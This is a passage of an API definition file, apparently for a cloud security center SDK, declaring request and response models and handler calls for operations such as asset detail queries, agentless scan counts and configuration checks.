  lang?: string(name='Lang', example='zh', position='Query'),
  value?: string(name='Value', example='ss', position='Query'),
}

model GetAegisContainerPluginRuleCriteriaResponseBody = {
  criteriaList?: [ 
    {
      name?: string(name='Name', example='containerScope'),
      type?: string(name='Type', example='select'),
      values?: string(name='Values', example='NO,YES'),
    }
  ](name='CriteriaList'),
  requestId?: string(name='RequestId', example='DA8133CC-CCA0-5CF2-BF64-FE7D52C44***'),
}

model GetAegisContainerPluginRuleCriteriaResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: GetAegisContainerPluginRuleCriteriaResponseBody(name='body'),
}

async function getAegisContainerPluginRuleCriteria(request: GetAegisContainerPluginRuleCriteriaRequest): GetAegisContainerPluginRuleCriteriaResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'GetAegisContainerPluginRuleCriteria', 'POST', '/', 'json', false, 'json', request);
}

model GetAgentlessTaskCountRequest {
}

model GetAgentlessTaskCountResponseBody = {
  baselineCheckCount?: int32(name='BaselineCheckCount', description='The number of baseline checks.', example='1'),
  cveVulCount?: int32(name='CveVulCount', description='The number of system vulnerabilities.', example='1'),
  lastTaskTime?: long(name='LastTaskTime', description='The timestamp generated when the last detection is performed.', example='1682577532318'),
  maliciousFile?: int32(name='MaliciousFile', description='The number of malicious files.', example='1'),
  requestId?: string(name='RequestId', description='The request ID.', example='D03DD0FD-6041-5107-AC00-383E28F1****'),
  riskMachine?: int32(name='RiskMachine', description='The number of risky hosts.', example='1'),
  scaVulCount?: int32(name='ScaVulCount', description='The number of application vulnerabilities.', example='1'),
  scanMachine?: int32(name='ScanMachine', description='The number of hosts that are scanned.', example='1'),
  sysVulCount?: string(name='SysVulCount', description='The total number of Windows system vulnerabilities.', example='1'),
  vulnerability?: int32(name='Vulnerability', description='The number of vulnerabilities.', example='1'),
}

model GetAgentlessTaskCountResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: GetAgentlessTaskCountResponseBody(name='body'),
}

async function getAgentlessTaskCount(request: GetAgentlessTaskCountRequest): GetAgentlessTaskCountResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'GetAgentlessTaskCount', 'POST', '/', 'json', false, 'json', request);
}

model GetAlarmMachineCountRequest {
  from?: string(name='From', description='The ID of the request source. Set the value to sas.', example='sas', position='Query'),
}

model GetAlarmMachineCountResponseBody = {
  data?: {
    machineCount?: int32(name='MachineCount', description='The number of servers on which alerts are generated.', example='1'),
  }(name='Data', description='The data returned.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='6D3A2E7D-1238-5DD4-B3C3-BF06FCAD****'),
}

model GetAlarmMachineCountResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: GetAlarmMachineCountResponseBody(name='body'),
}

async function getAlarmMachineCount(request: GetAlarmMachineCountRequest): GetAlarmMachineCountResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'GetAlarmMachineCount', 'POST', '/', 'json', false, 'json', request);
}

model GetAppNetworkRequest {
  clusterId?: string(name='ClusterId', description='The ID of the cluster to which the container belongs.

> You can call the [DescribeGroupedContainerInstances](~~DescribeGroupedContainerInstances~~) operation to query the IDs of container clusters.', example='cf77xxx', position='Query'),
  endTime?: long(name='EndTime', description='The end timestamp of the query. Unit: milliseconds.

> The days between the start timestamp and the end timestamp cannot exceed **seven** days.', example='1650470399999', position='Query'),
  startTime?: long(name='StartTime', description='The start timestamp of the query. Unit: milliseconds.

> The days between the start timestamp and the end timestamp cannot exceed **seven** days.', example='1649260800000', position='Query'),
}

model GetAppNetworkResponseBody = {
  appNetwork?: {
    edge?: [ 
      {
        dstNodeId?: string(name='DstNodeId', description='The ID of the destination node.', example='102'),
        dstNodeType?: string(name='DstNodeType', description='The type of the destination node. Valid values:

*   **app**: an application
*   **internet**: a network node in another cluster', example='app'),
        id?: string(name='Id', description='The ID of the edge.', example='3534'),
        port?: string(name='Port', description='The number of the destination port.', example='8080'),
        srcNodeId?: string(name='SrcNodeId', description='The ID of the source node.', example='101'),
        srcNodeType?: string(name='SrcNodeType', description='The type of the source node. Valid values:

*   **app**: an application
*   **internet**: a network node in another cluster', example='app'),
      }
    ](name='Edge', description='The information about the topology edge.'),
    namespace?: [ 
      {
        id?: string(name='Id', description='The ID of the namespace.', example='1'),
        name?: string(name='Name', description='The name of the custom namespace.', example='default'),
      }
    ](name='Namespace', description='The namespace.'),
    node?: [ 
      {
        containerIds?: [ string ](name='ContainerIds', description='The list of the container IDs.'),
        id?: string(name='Id', description='The ID of the node.', example='1274'),
        name?: string(name='Name', description='The name of the node.', example='console'),
        namespaceId?: string(name='NamespaceId', description='The ID of the namespace.', example='1'),
        riskLevel?: string(name='RiskLevel', description='The risk level. Valid values:

*   **3**: high
*   **2**: medium
*   **1**: low
*   **0**: warning
*   **-1**: unknown', example='0'),
        type?: string(name='Type', description='The type of the node. Valid values:

*   **app**: an application
*   **internet**: a network node in another cluster', example='app'),
      }
    ](name='Node', description='The information about the application node.'),
  }(name='AppNetwork', description='The information about the application network topology.'),
  requestId?: string(name='RequestId', description='The request ID.', example='7D46EDB0-xxx'),
}

model GetAppNetworkResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: GetAppNetworkResponseBody(name='body'),
}

async function getAppNetwork(request: GetAppNetworkRequest): GetAppNetworkResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'GetAppNetwork', 'GET', '/', 'json', false, 'json', request);
}

model GetAssetDetailByUuidRequest {
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh', position='Query'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request. The system specifies this parameter.', example='120.245.XX.XX', position='Query'),
  uuid: string(name='Uuid', description='The UUID of the server to query.

> You can call the [DescribeCloudCenterInstances](~~DescribeCloudCenterInstances~~) operation to query the UUIDs of servers.', example='9e6cad93-a379-46fd-a701-9bbf02f4****', position='Query'),
}

model GetAssetDetailByUuidResponseBody = {
  assetDetail?: {
    assetType?: string(name='AssetType', description='The type of the server. Valid values:

*   **0**: ECS instance
*   **1**: Server Load Balancer (SLB) instance
*   **2**: NAT gateway
*   **3**: ApsaraDB RDS instance
*   **4**: ApsaraDB for MongoDB instance
*   **5**: ApsaraDB for Redis instance
*   **6**: image
*   **7**: container', example='0'),
    authModifyTime?: long(name='AuthModifyTime', description='The timestamp when Security Center is authorized to protect the asset. Unit: milliseconds.', example='1627974044000'),
    authVersion?: int32(name='AuthVersion', description='The edition of Security Center that is authorized to protect the asset. Valid values:

*   **1**: Basic edition
*   **6**: Anti-virus edition
*   **5**: Advanced edition
*   **3**: Enterprise edition
*   **7**: Ultimate edition
*   **10**: Value-added Plan edition', example='7'),
    bind?: boolean(name='Bind', description='Indicates whether Security Center is authorized to protect the asset. Valid values:

*   **true**: Security Center is authorized to protect the asset.
*   **false**: Security Center is not authorized to protect the asset.', example='true'),
    clientStatus?: string(name='ClientStatus', description='The status of the Security Center agent. Valid values:

*   **pause**: The Security Center agent stops protecting your server.
*   **online**: The Security Center agent is protecting your server.
*   **offline**: The Security Center agent does not protect your server.', example='online'),
    clientVersion?: string(name='ClientVersion', description='The version of the Security Center agent.', example='2.0.0'),
    cpu?: int32(name='Cpu', description='The number of CPU cores.', example='2'),
    cpuInfo?: string(name='CpuInfo', description='The details of the CPU.', example='Intel(R) Xeon(R) Platinum 8163 CPU @ 2.50GHz'),
    createTime?: long(name='CreateTime', description='The timestamp when Security Center records the details of the server. Unit: milliseconds.', example='1603863599000'),
    diskInfoList?: [ 
      {
        diskName?: string(name='DiskName', description='The name of the disk.', example='/dev/vda1'),
        totalSize?: long(name='TotalSize', description='The total disk space. Unit: GB.', example='40'),
        totalSizeByte?: long(name='TotalSizeByte', description='The total disk space. Unit: bytes.', example='42140479488'),
        useSize?: long(name='UseSize', description='The amount of the used disk space. Unit: GB.', example='2'),
        useSizeByte?: long(name='UseSizeByte', description='The amount of the used disk space. Unit: bytes.', example='2998996992'),
      }
    ](name='DiskInfoList', description='The list of information about the disk.'),
    flag?: int32(name='Flag', description='Indicates whether the asset is provided by Alibaba Cloud. Valid values:

*   **0**: The server is provided by Alibaba Cloud.
*   **1**: The server is not provided by Alibaba Cloud.', example='0'),
    groupTrace?: string(name='GroupTrace', description='The group to which the server belongs. By default, the servers that are not grouped belong to the **Default** group.', example='default'),
    hostName?: string(name='HostName', description='The name of the host.', example='qewrqwerqs****'),
    instanceId?: string(name='InstanceId', description='The ID of the server.', example='i-uf6h7p2fgk6rkk0g****'),
    instanceName?: string(name='InstanceName', description='The name of the server.', example='i-fasdfasdfadfafa****'),
    internetIp?: string(name='InternetIp', description='The public IP address of the server.', example='120.47.XX.XX'),
    intranetIp?: string(name='IntranetIp', description='The private IP address of the server.', example='192.168.XX.XX'),
    ip?: string(name='Ip', description='The IP address that is assigned to the Elastic Compute Service (ECS) instance.', example='120.47.XX.XX'),
    ipList?: [ string ](name='IpList', description='An array that consists of the IP addresses of the server.'),
    kernel?: string(name='Kernel', description='The kernel version of the operating system.', example='4.18.0-80.11.2.el8_0.x86_64'),
    macList?: [ string ](name='MacList', description='An array that consists of the media access control (MAC) addresses of the server.'),
    mem?: int32(name='Mem', description='The memory size of the server. Unit: GB.', example='16'),
    memory?: long(name='Memory', description='The memory size of the server. Unit: MB.', example='16384'),
    os?: string(name='Os', description='The operating system type of the server.', example='linux'),
    osDetail?: string(name='OsDetail', description='The operating system version of the server.', example='Linux 64bit'),
    osName?: string(name='OsName', description='The name of the operating system that the server runs.', example='CentOS  7.4 64bit'),
    region?: string(name='Region', description='The region in which the server resides.', example='cn-shanghai'),
    regionId?: string(name='RegionId', description='The ID of the region in which the asset resides.', example='cn-hanghzou'),
    regionName?: string(name='RegionName', description='The name of the region in which the server resides.', example='China (Hohhot)'),
    sysInfo?: string(name='SysInfo', description='The operating system information about the server.', example='CentOS Linux 8.0.1905'),
    tag?: string(name='Tag', description='The tag that is added to the server.', example='InternetIp'),
    uuid?: string(name='Uuid', description='The UUID of the server.', example='9e6cad93-a379-46fd-a701-9bbf02f4****'),
    vpcInstanceId?: string(name='VpcInstanceId', description='The ID of the virtual private cloud (VPC) in which the server resides.', example='vpc-bp1fs3bwonlfq503w****'),
  }(name='AssetDetail', description='The details of the server.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='4892B68B-47BC-5E56-B327-9C2ACC6C1C09'),
}

model GetAssetDetailByUuidResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: GetAssetDetailByUuidResponseBody(name='body'),
}

async function getAssetDetailByUuid(request: GetAssetDetailByUuidRequest): GetAssetDetailByUuidResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'GetAssetDetailByUuid', 'POST', '/', 'json', false, 'json', request);
}

model GetAssetSelectionConfigRequest {
  businessType: string(name='BusinessType', description='The business type that you want to select for the asset. Valid values:

*   **VIRUS_SCAN_CYCLE_CONFIG**: virus detection configuration
*   **VIRUS_SCAN_ONCE_TASK**: one-time scan for virus detection', example='VIRUS_SCAN_CYCLE_CONFIG', position='Query'),
}

model GetAssetSelectionConfigResponseBody = {
  data?: {
    selectionKey?: string(name='SelectionKey', description='The ID of the current asset selection. It can be used to query and modify the asset that is selected.', example='657c8411-4e89-446c-ab66-d45d1331****'),
    targetType?: string(name='TargetType', description='The dimension based on which the asset is selected. Valid values:

*   **instance**: The asset is selected by server.
*   **group**: The asset is selected by group.
*   **vpc**: The asset is selected by VPC.', example='instance'),
  }(name='Data', description='The data returned.'),
  requestId?: string(name='RequestId', description='The request ID.', example='C5936B67-3EDF-53ED-A542-02543972449A'),
}

model GetAssetSelectionConfigResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: GetAssetSelectionConfigResponseBody(name='body'),
}

async function getAssetSelectionConfig(request: GetAssetSelectionConfigRequest): GetAssetSelectionConfigResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'GetAssetSelectionConfig', 'POST', '/', 'json', false, 'json', request);
}

model GetAssetsPropertyDetailRequest {
  biz: string(name='Biz', description='The type of the asset fingerprint that you want to query. Default value: **sca**. Valid values:

*   **lkm**: kernel module
*   **autorun**: startup item
*   **web_server**: website', example='lkm', position='Query'),
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Default value: **1**.', example='1', position='Query'),
  itemName?: string(name='ItemName', description='The name of the aggregation item for the asset fingerprint that you want to query.

> You can call the [GetAssetsPropertyItem](~~GetAssetsPropertyItem~~) operation to query the names of aggregation items.', example='virtio', position='Query'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Valid values:

*   **zh**: Chinese
*   **en**: English', example='en', position='Query'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page. Default value: 20. If you leave this parameter empty, 20 entries are returned on each page.

> We recommend that you do not leave this parameter empty.', example='20', position='Query'),
  remark?: string(name='Remark', description='The name or IP address of the server.', example='1.2.XX.XX', position='Query'),
  searchCriteriaList?: [ 
    {
      name?: string(name='Name', description='The name of the condition. Valid values:

*   **remarkItemName**: the aggregation item of the asset fingerprints. Fuzzy match is supported.

> *   If **Biz** is set to **web_server**, **remarkItemName** specifies a domain name. 
> *   If **Biz** is set to **lkm**, **remarkItemName** specifies a module name.
> *   If **Biz** is set to **autorun**, **remarkItemName** specifies the path to a startup item.', example='remarkItemName'),
      value?: string(name='Value', description='The value of the condition.', example='virtio'),
    }
  ](name='SearchCriteriaList', description='The conditions that are used to query the details about the asset fingerprint.', position='Query'),
  uuid?: string(name='Uuid', description='The UUID of the server.

> You can call the [DescribeCloudCenterInstances](~~DescribeCloudCenterInstances~~) operation to query the UUIDs of servers.', example='38f72ea4-4c9f-4df1-bc6c-0f267614****', position='Query'),
}

model GetAssetsPropertyDetailResponseBody = {
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='20'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='23'),
  }(name='PageInfo', description='The pagination information.'),
  propertys?: [ 
    {
      containerName?: string(name='ContainerName', description='The name of the container.', example='5-rce_web_1'),
      createTimestamp?: long(name='CreateTimestamp', description='The timestamp of the last fingerprint collection. Unit: milliseconds.', example='1649149566000'),
      domain?: string(name='Domain', description='The domain name of the website.

> This parameter is returned only when **Biz** is set to **web_server**.', example='localhost'),
      filepath?: string(name='Filepath', description='The path to the kernel module file.

> This parameter is returned only when **Biz** is set to **lkm**.', example='/lib/modules/4****'),
      imageName?: string(name='ImageName', description='The name of the image.', example='registry-vpc.cn-beijing.aliyuncs.com/acs/aliyun-ingress-controller****'),
      instanceId?: string(name='InstanceId', description='The ID of the server.', example='i-hp35tftuh52wbp1g****'),
      instanceName?: string(name='InstanceName', description='The name of the server.', example='hc-host-****'),
      internetIp?: string(name='InternetIp', description='The public IP address of the server.', example='47.42.XX.XX'),
      intranetIp?: string(name='IntranetIp', description='The private IP address of the server.', example='100.104.XX.XX'),
      ip?: string(name='Ip', description='The IP address of the server.', example='47.42.XX.XX'),
      listenProtocol?: string(name='ListenProtocol', description='The listening protocol that the website uses.

> This parameter is returned only when **Biz** is set to **web_server**.', example='tcp'),
      moduleName?: string(name='ModuleName', description='The name of the module.

> This parameter is returned only when **Biz** is set to **lkm**.', example='alihids'),
      path?: string(name='Path', description='The path. The value of this parameter varies based on the value of **Biz**.

*   If **Biz** is set to **web_server**, the value of this parameter indicates the path to the website root directory.
*   If **Biz** is set to **autorun**, the value of this parameter indicates the path to the startup item.', example='/lib/systemd/system****'),
      pathMode?: string(name='PathMode', description='The permissions on the root directory of the website.

> This parameter is returned only when **Biz** is set to **web_server**.', example='755'),
      pid?: string(name='Pid', description='The process ID (PID) of the process that runs the website service.

> This parameter is returned only when **Biz** is set to **web_server**.', example='813'),
      port?: string(name='Port', description='The port of the website.

> This parameter is returned only when **Biz** is set to **web_server**.', example='80'),
      processStarted?: long(name='ProcessStarted', description='The timestamp generated when the process was started. Unit: milliseconds.

> This parameter is returned only when **Biz** is set to **web_server**.', example='1671186801000'),
      regionId?: string(name='RegionId', description='The ID of the region in which the server resides.', example='cn-hangzhou'),
      serverType?: string(name='ServerType', description='The type of the website.

> This parameter is returned only when **Biz** is set to **web_server**.', example='nginx'),
      size?: int32(name='Size', description='The size of the kernel module.

> This parameter is returned only when **Biz** is set to **lkm**.', example='10'),
      usedByCount?: int32(name='UsedByCount', description='The number of times that the kernel module is referenced.

> This parameter is returned only when **Biz** is set to **lkm**.', example='0'),
      user?: string(name='User', description='The user who started the process of the website.

> This parameter is returned only when **Biz** is set to **web_server**.', example='root'),
      uuid?: string(name='Uuid', description='The UUID of the server.', example='162eb349-c2d9-4f8b-805c-75b43d4c****'),
      webPath?: string(name='WebPath', description='The path to the root directory of the website.

> This parameter is returned only when **Biz** is set to **web_server**.', example='/usr/share/nginx/html'),
    }
  ](name='Propertys', description='An array that consists of the details about the asset fingerprints.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='4C1AE3F3-18FA-4108-BBB9-AFA1A032****'),
}

model GetAssetsPropertyDetailResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: GetAssetsPropertyDetailResponseBody(name='body'),
}

async function getAssetsPropertyDetail(request: GetAssetsPropertyDetailRequest): GetAssetsPropertyDetailResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'GetAssetsPropertyDetail', 'POST', '/', 'json', false, 'json', request);
}

model GetAssetsPropertyItemRequest {
  biz: string(name='Biz', description='The type of the asset fingerprint that you want to query. Default value: **sca**. Valid values:

*   **lkm**: kernel module
*   **autorun**: startup item
*   **web_server**: website', example='lkm', position='Query'),
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Default value: **1**.', example='1', minimum=1, position='Query'),
  forceFlush?: boolean(name='ForceFlush', description='Specifies whether to forcefully refresh the data that you want to query. Valid values:

*   **true**: yes
*   **false**: no', example='false', position='Query'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   zh: Chinese
*   en: English', example='en', position='Query'),
  pageSize?: int32(name='PageSize', description='The number of entries per page. Default value: 20. If you leave this parameter empty, 20 entries are returned on each page.

> We recommend that you do not leave this parameter empty.', example='20', minimum=1, maximum=1000, position='Query'),
  searchInfo?: string(name='SearchInfo', description='The value of the search condition. You must specify this parameter based on the value of the **SearchItem** parameter.

*   If you set **SearchItem** to **domain**, you must enter the domain name.
*   If you set **SearchItem** to **module_name**, you must enter the module name.
*   If you set **SearchItem** to **path**, you must enter the path to the self-starting item.

>  You must specify both the **SearchItem** and **SearchInfo** parameters before you can query the information about asset fingerprints by asset fingerprint name.', example='/lib/systemd/s****', position='Query'),
  searchItem?: string(name='SearchItem', description='The type of the search condition. You must specify this parameter based on the value of the **Biz** parameter. Valid values:

*   If you set **Biz** to **web_server**, set **SearchItem** to the following value:

    *   **domain**: the domain name

*   If you set **Biz** to **lkm**, set **SearchItem** to the following value:

    *   **module_name**: the name of the module

*   If you set **Biz** to **autorun**, set **SearchItem** to the following value:

    *   **path**: the path to the self-starting item

>  You must specify both the **SearchItem** and **SearchInfo** parameters before you can query the information about asset fingerprints by asset fingerprint name.', example='path', position='Query'),
}

model GetAssetsPropertyItemResponseBody = {
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='20'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='45'),
  }(name='PageInfo', description='The pagination information.'),
  propertyItems?: [ 
    {
      count?: int32(name='Count', description='The number of servers related to the asset fingerprints.', example='23'),
      domain?: string(name='Domain', description='The endpoint.

> This parameter is returned only when **Biz** is set to **web_server**.', example='localhost'),
      moduleName?: string(name='ModuleName', description='The name of the module.

> This parameter is returned only when **Biz** is set to **lkm**.', example='alihids'),
      path?: string(name='Path', description='The path to the startup item.

> This parameter is returned only when **Biz** is set to **autorun**.', example='C:/Program Files/****'),
    }
  ](name='PropertyItems', description='An array that consists of the aggregation information about asset fingerprints.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='340D7FC4-D575-1661-8ACD-CFA7BE57****'),
}

model GetAssetsPropertyItemResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: GetAssetsPropertyItemResponseBody(name='body'),
}

async function getAssetsPropertyItem(request: GetAssetsPropertyItemRequest): GetAssetsPropertyItemResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'GetAssetsPropertyItem', 'POST', '/', 'json', false, 'json', request);
}

model GetAuthVersionStatisticRequest {
}

model GetAuthVersionStatisticResponseBody = {
  requestId?: string(name='RequestId', description='The request ID.', example='2CA2BDF6-F3BD-51A4-BAAC-30B02F7A3FBB'),
  statistics?: [ 
    {
      authVersion?: int32(name='AuthVersion', description='The edition of Security Center. Valid values:

*   **1**: Basic edition (Unauthorized)
*   **6**: Anti-virus edition
*   **5**: Advanced edition
*   **3**: Enterprise edition
*   **7**: Ultimate edition
*   **10**: Value-added Plan edition', example='6'),
      count?: int32(name='Count', description='The number of authorized servers.', example='1'),
    }
  ](name='Statistics', description='The statistics about the numbers of assets protected by each edition of Security Center.'),
}

model GetAuthVersionStatisticResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: GetAuthVersionStatisticResponseBody(name='body'),
}

async function getAuthVersionStatistic(request: GetAuthVersionStatisticRequest): GetAuthVersionStatisticResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'GetAuthVersionStatistic', 'POST', '/', 'json', false, 'json', request);
}

model GetBackupStorageCountRequest {
}

model GetBackupStorageCountResponseBody = {
  backupStorageCount?: {
    buyStorageByte?: long(name='BuyStorageByte', example='2276332666880'),
    ecsUsageStorageByte?: long(name='EcsUsageStorageByte', example='817262417803'),
    overflow?: int32(name='Overflow', example='0'),
    uniUsageStorageByte?: long(name='UniUsageStorageByte', example='7453049350'),
    usageStorageByte?: long(name='UsageStorageByte', example='839621565853'),
  }(name='BackupStorageCount'),
  requestId?: string(name='RequestId', example='33C2CCFF-4BF8-5F88-9B5C-22F932F80E5A'),
}

model GetBackupStorageCountResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: GetBackupStorageCountResponseBody(name='body'),
}

async function getBackupStorageCount(request: GetBackupStorageCountRequest): GetBackupStorageCountResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'GetBackupStorageCount', 'POST', '/', 'json', false, 'json', request);
}

model GetCheckConfigRequest {
}

model GetCheckConfigResponseBody = {
  cycleDays?: [ int32 ](name='CycleDays', description='The days in a week on which an automatic check is performed.'),
  enableAddCheck?: boolean(name='EnableAddCheck', description='Indicates whether the check for new check items in the selected requirement item is enabled by default. Valid values:

*   **true**
*   **false**', example='false'),
  enableAutoCheck?: boolean(name='EnableAutoCheck', description='Indicates whether the automatic check is enabled. Valid values:

*   **true**
*   **false**', example='true'),
  endTime?: int32(name='EndTime', description='The end time of the check. The value indicates a point in time. The time period that is specified by the start time and end time must be one of the following time periods:

*   **00:00 to 06:00**: If StartTime is set to 00:00, EndTime must be set to 06:00.
*   **06:00 to 12:00**: If StartTime is set to 06:00, EndTime must be set to 12:00.
*   **12:00 to 18:00**: If StartTime is set to 12:00, EndTime must be set to 18:00.
*   **18:00 to 24:00**: If StartTime is set to 18:00, EndTime must be set to 24:00.', example='6'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='5A3D5C8F-2A42-5477-BDD8-27E64B5F1739'),
  selectedChecks?: [ 
    {
      checkId?: long(name='CheckId', description='The ID of the check item.', example='3'),
      sectionId?: long(name='SectionId', description='The section ID of the check item.', example='69'),
    }
  ](name='SelectedChecks', description='The check items selected in the policy.'),
  standards?: [ 
    {
      id?: long(name='Id', description='The ID of the check item.', example='1'),
      showName?: string(name='ShowName', description='The name of the check item.', example='Cloud service configuration management'),
      status?: string(name='Status', description='The status of the check item. Valid values:

*   **ON**: The check item is enabled.
*   **OFF**: The check item is disabled.', example='ON'),
      type?: string(name='Type', description='The type of the check item. Valid values:

*   **RISK**: cloud service configuration management
*   **IDENTITY_PERMISSION**: identity and permission management
*   **COMPLIANCE**: compliance', example='RISK'),
    }
  ](name='Standards', description='The information about the check items.'),
  startTime?: int32(name='StartTime', description='The start time of the check. The value indicates a point in time.', example='0'),
}

model GetCheckConfigResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: GetCheckConfigResponseBody(name='body'),
}

async function getCheckConfig(request: GetCheckConfigRequest): GetCheckConfigResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'GetCheckConfig', 'POST', '/', 'json', false, 'json', request);
}

model GetCheckDetailRequest {
  checkId: long(name='CheckId', description='The ID of the check item.', example='2', position='Query'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='en', position='Query'),
  regionId?: string(name='RegionId', description='The ID of the region in which the server resides.', example='cn-hangzhou', position='Query'),
}

model GetCheckDetailResponseBody = {
  assistInfo?: {
    link?: string(name='Link', description='The link to the help information about the risk item when the Type parameter is set to link.', example='https://www.alibabacloud.com/help/en/resource-access-management/latest/faq-about-ram-users'),
    type?: string(name='Type', description='The type of the help information about the risk item. Valid values:

*   **text**
*   **link**', example='text'),
    value?: string(name='Value', description='The content in the help information about the risk item when the Type parameter is set to text.', example='Configure an IP address whitelist'),
  }(name='AssistInfo', description='The help information about the check item.'),
  customConfigs?: [ 
    {
      defaultValue?: string(name='DefaultValue', description='The default value of the custom configuration item. The value is a string.', example='12'),
      name?: string(name='Name', description='The name of the custom configuration item. The name of a custom configuration item is unique in a check item.', example='SessionTimeMax'),
      showName?: string(name='ShowName', description='The keyword that identifies the custom configuration item for internationalization.', example='Maximum session time'),
      typeDefine?: string(name='TypeDefine', description='The type of the custom configuration item. The value is a JSON string.', example='{\\"type\\":\\"NUMBER\\",\\"range\\":[1,24]}'),
      value?: string(name='Value', description='The value of the custom configuration item. The value is a string.', example='11'),
    }
  ](name='CustomConfigs', description='The custom configuration items of the check item.'),
  description?: {
    link?: string(name='Link', description='The link to the description of the check item.', example='https://www.alibabacloud.com/help/en/object-storage-service/latest/tutorial-implement-data-sharing-across-departments-based-on-bucket-policies'),
    type?: string(name='Type', description='The type of the description of the check item. The value is fixed as text.', example='text'),
    value?: string(name='Value', description='The content in the description of the check item.', example='The MSE instance does not enable authentication by default. If public network access is enabled at the same time, the data in the configuration center may be dragged and there is a security risk.'),
  }(name='Description', description='The description of the check item.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='15A6ED6A-DBFE-5255-A248-289907809BEC'),
  solution?: {
    link?: string(name='Link', description='The link to the solution to handle the risk item when the Type parameter is set to link.', example='https://www.alibabacloud.com/help/en/object-storage-service/latest/tutorial-implement-data-sharing-across-departments-based-on-bucket-policies'),
    type?: string(name='Type', description='The type of the solution to handle the risk item. Valid values:

*   **text**
*   **link**', example='text'),
    value?: string(name='Value', description='The content of the solution to handle the risk item when the Type parameter is set to text.', example='Enter the MSE product console - registration and configuration center - instance list, click the corresponding instance name to enter the instance details, find the public network whitelist setting option in the basic information, and configure the whitelist according to business needs. It is forbidden to configure 0.0.0.0 or the whitelist as null.'),
  }(name='Solution', description='The solution to handle the risk item.'),
}

model GetCheckDetailResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: GetCheckDetailResponseBody(name='body'),
}

async function getCheckDetail(request: GetCheckDetailRequest): GetCheckDetailResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'GetCheckDetail', 'POST', '/', 'json', false, 'json', request);
}

model GetCheckProcessRequest {
  taskId?: string(name='TaskId', description='The ID of the task.

> You can call the [SubmitCheck](~~SubmitCheck~~) operation to query the ID.', example='5347c7b6-c85c-4070-846a-3029e08e****', position='Query'),
}

model GetCheckProcessResponseBody = {
  finishCount?: int32(name='FinishCount', description='The total number of assets on which the task is complete.', example='80'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='D18B5DAD-BA97-5552-AE48-83F59D5F****'),
  totalCount?: int32(name='TotalCount', description='The total number of assets on which the task is performed.', example='113'),
}

model GetCheckProcessResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: GetCheckProcessResponseBody(name='body'),
}

async function getCheckProcess(request: GetCheckProcessRequest): GetCheckProcessResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'GetCheckProcess', 'POST', '/', 'json', false, 'json', request);
}

model GetCheckRiskStatisticsRequest {
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Default value: 1.', example='1', position='Query'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh', position='Query'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page. Default value: 20. If you leave this parameter empty, 20 entries are returned on each page.

>  We recommend that you do not leave this parameter empty.', example='20', position='Query'),
}

model GetCheckRiskStatisticsResponseBody = {
  count?: int32(name='Count', description='The number of risk scenarios.', example='3'),
  data?: [ 
    {
